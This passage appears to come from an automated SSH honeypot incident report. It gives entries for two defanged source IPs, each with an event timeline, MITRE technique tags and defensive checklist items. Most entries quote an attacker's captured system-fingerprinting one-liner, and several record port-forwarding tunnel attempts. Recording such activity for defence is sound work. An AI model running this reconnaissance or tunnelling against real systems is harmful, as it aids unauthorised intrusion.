| `2026-09-04 11:06:12` | `cowrie.direct-tcpip.request` |
| `2026-09-04 11:06:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 11:06:12` | `cowrie.direct-tcpip.data` |
| `2026-09-04 11:06:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21f81b35c30a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:08 |
| **Last Seen** | 2026-09-04 11:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:08:13` | `cowrie.session.connect` |
| `2026-09-04 11:08:13` | `cowrie.client.version` |
| `2026-09-04 11:08:13` | `cowrie.client.kex` |
| `2026-09-04 11:08:16` | `cowrie.login.success` |
| `2026-09-04 11:08:18` | `cowrie.session.params` |
| `2026-09-04 11:08:18` | `cowrie.command.input` |
| `2026-09-04 11:08:18` | `cowrie.command.input` |
| `2026-09-04 11:08:18` | `cowrie.command.input` |
| `2026-09-04 11:08:18` | `cowrie.command.input` |
| `2026-09-04 11:08:18` | `cowrie.command.input` |
| `2026-09-04 11:08:18` | `cowrie.command.success` |
| `2026-09-04 11:08:18` | `cowrie.command.input` |
| `2026-09-04 11:08:18` | `cowrie.command.input` |
| `2026-09-04 11:08:18` | `cowrie.command.input` |
| `2026-09-04 11:08:18` | `cowrie.command.input` |
| `2026-09-04 11:08:18` | `cowrie.log.closed` |
| `2026-09-04 11:08:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5500d97bb3ca

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:09 |
| **Last Seen** | 2026-09-04 11:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:09:29` | `cowrie.session.connect` |
| `2026-09-04 11:09:29` | `cowrie.client.version` |
| `2026-09-04 11:09:29` | `cowrie.client.kex` |
| `2026-09-04 11:09:31` | `cowrie.login.success` |
| `2026-09-04 11:09:32` | `cowrie.session.params` |
| `2026-09-04 11:09:32` | `cowrie.command.input` |
| `2026-09-04 11:09:32` | `cowrie.command.input` |
| `2026-09-04 11:09:32` | `cowrie.command.input` |
| `2026-09-04 11:09:32` | `cowrie.command.input` |
| `2026-09-04 11:09:32` | `cowrie.command.input` |
| `2026-09-04 11:09:32` | `cowrie.command.success` |
| `2026-09-04 11:09:32` | `cowrie.command.input` |
| `2026-09-04 11:09:32` | `cowrie.command.input` |
| `2026-09-04 11:09:32` | `cowrie.command.input` |
| `2026-09-04 11:09:32` | `cowrie.command.input` |
| `2026-09-04 11:09:33` | `cowrie.log.closed` |
| `2026-09-04 11:09:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abb60cbe4ef4

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:10 |
| **Last Seen** | 2026-09-04 11:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:10:46` | `cowrie.session.connect` |
| `2026-09-04 11:10:46` | `cowrie.client.version` |
| `2026-09-04 11:10:46` | `cowrie.client.kex` |
| `2026-09-04 11:10:49` | `cowrie.login.success` |
| `2026-09-04 11:10:51` | `cowrie.session.params` |
| `2026-09-04 11:10:51` | `cowrie.command.input` |
| `2026-09-04 11:10:51` | `cowrie.command.input` |
| `2026-09-04 11:10:51` | `cowrie.command.input` |
| `2026-09-04 11:10:51` | `cowrie.command.input` |
| `2026-09-04 11:10:51` | `cowrie.command.input` |
| `2026-09-04 11:10:51` | `cowrie.command.success` |
| `2026-09-04 11:10:51` | `cowrie.command.input` |
| `2026-09-04 11:10:51` | `cowrie.command.input` |
| `2026-09-04 11:10:51` | `cowrie.command.input` |
| `2026-09-04 11:10:51` | `cowrie.command.input` |
| `2026-09-04 11:10:52` | `cowrie.log.closed` |
| `2026-09-04 11:10:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01eac5077994

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:12 |
| **Last Seen** | 2026-09-04 11:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:12:07` | `cowrie.session.connect` |
| `2026-09-04 11:12:08` | `cowrie.client.version` |
| `2026-09-04 11:12:08` | `cowrie.client.kex` |
| `2026-09-04 11:12:11` | `cowrie.login.success` |
| `2026-09-04 11:12:13` | `cowrie.session.params` |
| `2026-09-04 11:12:13` | `cowrie.command.input` |
| `2026-09-04 11:12:13` | `cowrie.command.input` |
| `2026-09-04 11:12:13` | `cowrie.command.input` |
| `2026-09-04 11:12:13` | `cowrie.command.input` |
| `2026-09-04 11:12:13` | `cowrie.command.input` |
| `2026-09-04 11:12:13` | `cowrie.command.success` |
| `2026-09-04 11:12:13` | `cowrie.command.input` |
| `2026-09-04 11:12:13` | `cowrie.command.input` |
| `2026-09-04 11:12:13` | `cowrie.command.input` |
| `2026-09-04 11:12:13` | `cowrie.command.input` |
| `2026-09-04 11:12:14` | `cowrie.log.closed` |
| `2026-09-04 11:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c2ef23a7b76

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:13 |
| **Last Seen** | 2026-09-04 11:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:13:26` | `cowrie.session.connect` |
| `2026-09-04 11:13:27` | `cowrie.client.version` |
| `2026-09-04 11:13:27` | `cowrie.client.kex` |
| `2026-09-04 11:13:30` | `cowrie.login.success` |
| `2026-09-04 11:13:31` | `cowrie.session.params` |
| `2026-09-04 11:13:31` | `cowrie.command.input` |
| `2026-09-04 11:13:31` | `cowrie.command.input` |
| `2026-09-04 11:13:31` | `cowrie.command.input` |
| `2026-09-04 11:13:31` | `cowrie.command.input` |
| `2026-09-04 11:13:32` | `cowrie.command.input` |
| `2026-09-04 11:13:32` | `cowrie.command.success` |
| `2026-09-04 11:13:32` | `cowrie.command.input` |
| `2026-09-04 11:13:32` | `cowrie.command.input` |
| `2026-09-04 11:13:32` | `cowrie.command.input` |
| `2026-09-04 11:13:32` | `cowrie.command.input` |
| `2026-09-04 11:13:32` | `cowrie.log.closed` |
| `2026-09-04 11:13:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28f4ce936a46

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:14 |
| **Last Seen** | 2026-09-04 11:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:14:42` | `cowrie.session.connect` |
| `2026-09-04 11:14:43` | `cowrie.client.version` |
| `2026-09-04 11:14:43` | `cowrie.client.kex` |
| `2026-09-04 11:14:46` | `cowrie.login.success` |
| `2026-09-04 11:14:48` | `cowrie.session.params` |
| `2026-09-04 11:14:48` | `cowrie.command.input` |
| `2026-09-04 11:14:48` | `cowrie.command.input` |
| `2026-09-04 11:14:48` | `cowrie.command.input` |
| `2026-09-04 11:14:48` | `cowrie.command.input` |
| `2026-09-04 11:14:48` | `cowrie.command.input` |
| `2026-09-04 11:14:48` | `cowrie.command.success` |
| `2026-09-04 11:14:48` | `cowrie.command.input` |
| `2026-09-04 11:14:48` | `cowrie.command.input` |
| `2026-09-04 11:14:48` | `cowrie.command.input` |
| `2026-09-04 11:14:48` | `cowrie.command.input` |
| `2026-09-04 11:14:48` | `cowrie.log.closed` |
| `2026-09-04 11:14:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9bce50d8983

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:15 |
| **Last Seen** | 2026-09-04 11:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:15:59` | `cowrie.session.connect` |
| `2026-09-04 11:16:00` | `cowrie.client.version` |
| `2026-09-04 11:16:00` | `cowrie.client.kex` |
| `2026-09-04 11:16:03` | `cowrie.login.success` |
| `2026-09-04 11:16:05` | `cowrie.session.params` |
| `2026-09-04 11:16:05` | `cowrie.command.input` |
| `2026-09-04 11:16:05` | `cowrie.command.input` |
| `2026-09-04 11:16:05` | `cowrie.command.input` |
| `2026-09-04 11:16:05` | `cowrie.command.input` |
| `2026-09-04 11:16:05` | `cowrie.command.input` |
| `2026-09-04 11:16:05` | `cowrie.command.success` |
| `2026-09-04 11:16:05` | `cowrie.command.input` |
| `2026-09-04 11:16:05` | `cowrie.command.input` |
| `2026-09-04 11:16:05` | `cowrie.command.input` |
| `2026-09-04 11:16:05` | `cowrie.command.input` |
| `2026-09-04 11:16:06` | `cowrie.log.closed` |
| `2026-09-04 11:16:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba1469d23be4

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:17 |
| **Last Seen** | 2026-09-04 11:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:17:16` | `cowrie.session.connect` |
| `2026-09-04 11:17:17` | `cowrie.client.version` |
| `2026-09-04 11:17:17` | `cowrie.client.kex` |
| `2026-09-04 11:17:19` | `cowrie.login.success` |
| `2026-09-04 11:17:22` | `cowrie.session.params` |
| `2026-09-04 11:17:22` | `cowrie.command.input` |
| `2026-09-04 11:17:22` | `cowrie.command.input` |
| `2026-09-04 11:17:22` | `cowrie.command.input` |
| `2026-09-04 11:17:22` | `cowrie.command.input` |
| `2026-09-04 11:17:22` | `cowrie.command.input` |
| `2026-09-04 11:17:22` | `cowrie.command.success` |
| `2026-09-04 11:17:22` | `cowrie.command.input` |
| `2026-09-04 11:17:22` | `cowrie.command.input` |
| `2026-09-04 11:17:22` | `cowrie.command.input` |
| `2026-09-04 11:17:22` | `cowrie.command.input` |
| `2026-09-04 11:17:22` | `cowrie.log.closed` |
| `2026-09-04 11:17:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6c75c52c573

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 11:17 |
| **Last Seen** | 2026-09-04 11:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:17:28` | `cowrie.session.connect` |
| `2026-09-04 11:17:28` | `cowrie.client.version` |
| `2026-09-04 11:17:28` | `cowrie.client.kex` |
| `2026-09-04 11:17:29` | `cowrie.login.success` |
| `2026-09-04 11:17:29` | `cowrie.direct-tcpip.request` |
| `2026-09-04 11:17:29` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 11:17:29` | `cowrie.direct-tcpip.data` |
| `2026-09-04 11:17:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaa2311af08d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:18 |
| **Last Seen** | 2026-09-04 11:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:18:32` | `cowrie.session.connect` |
| `2026-09-04 11:18:33` | `cowrie.client.version` |
| `2026-09-04 11:18:33` | `cowrie.client.kex` |
| `2026-09-04 11:18:35` | `cowrie.login.success` |
| `2026-09-04 11:18:36` | `cowrie.session.params` |
| `2026-09-04 11:18:36` | `cowrie.command.input` |
| `2026-09-04 11:18:36` | `cowrie.command.input` |
| `2026-09-04 11:18:36` | `cowrie.command.input` |
| `2026-09-04 11:18:36` | `cowrie.command.input` |
| `2026-09-04 11:18:36` | `cowrie.command.input` |
| `2026-09-04 11:18:36` | `cowrie.command.success` |
| `2026-09-04 11:18:36` | `cowrie.command.input` |
| `2026-09-04 11:18:36` | `cowrie.command.input` |
| `2026-09-04 11:18:36` | `cowrie.command.input` |
| `2026-09-04 11:18:36` | `cowrie.command.input` |
| `2026-09-04 11:18:37` | `cowrie.log.closed` |
| `2026-09-04 11:18:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49bac547222d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:19 |
| **Last Seen** | 2026-09-04 11:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:19:47` | `cowrie.session.connect` |
| `2026-09-04 11:19:48` | `cowrie.client.version` |
| `2026-09-04 11:19:48` | `cowrie.client.kex` |
| `2026-09-04 11:19:50` | `cowrie.login.success` |
| `2026-09-04 11:19:52` | `cowrie.session.params` |
| `2026-09-04 11:19:52` | `cowrie.command.input` |
| `2026-09-04 11:19:52` | `cowrie.command.input` |
| `2026-09-04 11:19:52` | `cowrie.command.input` |
| `2026-09-04 11:19:52` | `cowrie.command.input` |
| `2026-09-04 11:19:52` | `cowrie.command.input` |
| `2026-09-04 11:19:52` | `cowrie.command.success` |
| `2026-09-04 11:19:52` | `cowrie.command.input` |
| `2026-09-04 11:19:52` | `cowrie.command.input` |
| `2026-09-04 11:19:52` | `cowrie.command.input` |
| `2026-09-04 11:19:52` | `cowrie.command.input` |
| `2026-09-04 11:19:52` | `cowrie.log.closed` |
| `2026-09-04 11:19:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8515ad86a03

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:21 |
| **Last Seen** | 2026-09-04 11:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 11:21:03` | `cowrie.session.connect` |
| `2026-09-04 11:21:04` | `cowrie.client.version` |
| `2026-09-04 11:21:04` | `cowrie.client.kex` |
| `2026-09-04 11:21:06` | `cowrie.login.success` |
| `2026-09-04 11:21:08` | `cowrie.session.params` |
| `2026-09-04 11:21:08` | `cowrie.command.input` |
| `2026-09-04 11:21:08` | `cowrie.command.input` |
| `2026-09-04 11:21:08` | `cowrie.command.input` |
| `2026-09-04 11:21:08` | `cowrie.command.input` |
| `2026-09-04 11:21:08` | `cowrie.command.input` |
| `2026-09-04 11:21:08` | `cowrie.command.success` |
| `2026-09-04 11:21:08` | `cowrie.command.input` |
| `2026-09-04 11:21:08` | `cowrie.command.input` |
| `2026-09-04 11:21:08` | `cowrie.command.input` |
| `2026-09-04 11:21:08` | `cowrie.command.input` |
| `2026-09-04 11:21:08` | `cowrie.log.closed` |
| `2026-09-04 11:21:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe5f38958c0d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-04 11:22 |
| **Last Seen** | 2026-09-04 11:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
